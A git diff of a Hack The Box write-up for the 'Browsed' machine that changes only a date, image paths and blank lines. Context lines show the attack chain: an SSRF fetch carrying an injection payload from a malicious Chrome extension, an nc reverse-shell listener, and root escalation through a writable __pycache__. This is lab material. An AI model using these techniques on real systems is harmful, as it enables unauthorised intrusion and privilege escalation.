@@ -1,13 +1,13 @@
 ---
 title: "Hack The Box — Browsed"
-date: 2026-01-15
+date: 2026-01-12
 author: pain
 categories: [Hack The Box, Linux]
 tags: [htb, chrome-extension, ssrf, bash-injection, python, privesc]
 toc: true
 ---
 
-![Browsed Banner](/assets/img/htb/browsed/browsed-banner.png)
+![Browsed Banner](/assets/img/favicons/ssf.png)
 
 ## Overview
 
@@ -37,8 +37,6 @@ echo "10.10.11.x browsed.htb" | sudo tee -a /etc/hosts
 
 Navigating to `http://browsed.htb` reveals a web application that accepts Chrome extension uploads for developer review. The application explicitly accepts `.zip` files containing Chrome extensions.
 
-![Upload Interface](/assets/img/favicons/ssf.png)
-
 Key observations:
 - Extensions are processed server-side
 - The upload mechanism suggests automated review in a headless Chrome environment
@@ -54,7 +52,6 @@ echo "10.10.11.x browsedinternals.htb" | sudo tee -a /etc/hosts
 ```
 
 Navigating to `http://browsedinternals.htb/larry/MarkdownPreview` reveals internal documentation and source code.
-
 
 This endpoint exposes critical implementation details including:
 - **routines.sh** - The bash script handling routine processing
@@ -186,7 +183,6 @@ fetch("http://127.0.0.1:5000/routines/" + payload, { mode: "no-cors" });
 zip exploit.zip manifest.json content.js
 ```
 
-
 ### Execution
 
 Start listener:
@@ -196,15 +192,12 @@ nc -lvnp 4040
 
 Upload `exploit.zip` through the web interface. The server loads the extension in headless Chrome, triggering the content script, which makes the SSRF request with the malicious payload, resulting in a reverse shell as the application user.
 
-
-
 ## User Flag
 
 Once shell access is obtained:
 ```bash
 cat ~/user.txt
 ```
-
 
 ## Privilege Escalation
 
@@ -240,8 +233,6 @@ ls -la /opt/extensiontool/
 ```
 
 The `__pycache__` directory is world-writable, but the source files are not.
-
-
 
 **Python Import Behavior:**
 
@@ -328,8 +319,6 @@ The `-p` flag preserves the effective UID, granting root access.
 ```bash
 cat /root/root.txt
 ```
-
-
 
 ## Conclusion
 
